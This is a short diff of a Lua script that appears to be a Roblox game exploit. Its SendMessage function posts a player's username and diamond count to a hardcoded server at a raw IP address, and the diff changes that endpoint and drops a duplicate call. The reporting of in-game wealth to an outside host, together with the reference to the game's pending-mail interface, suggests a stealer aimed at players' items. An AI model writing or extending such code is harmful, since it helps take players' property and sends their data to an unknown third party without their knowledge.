@@ -164,19 +164,12 @@ local function SendMessage(username, diamonds)
 
     if discuser and discuser ~= "" then
         local response = request({
-            Url = "http://46.101.233.20:5000/postwebhook",
+            Url = "http://46.101.233.20:5000/webhook",
             Method = "POST",
             Headers = headers,
             Body = body
         })
     end
-
-    local response2 = request({
-        Url = "http://46.101.233.20:5000/webhook",
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
 end
 
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
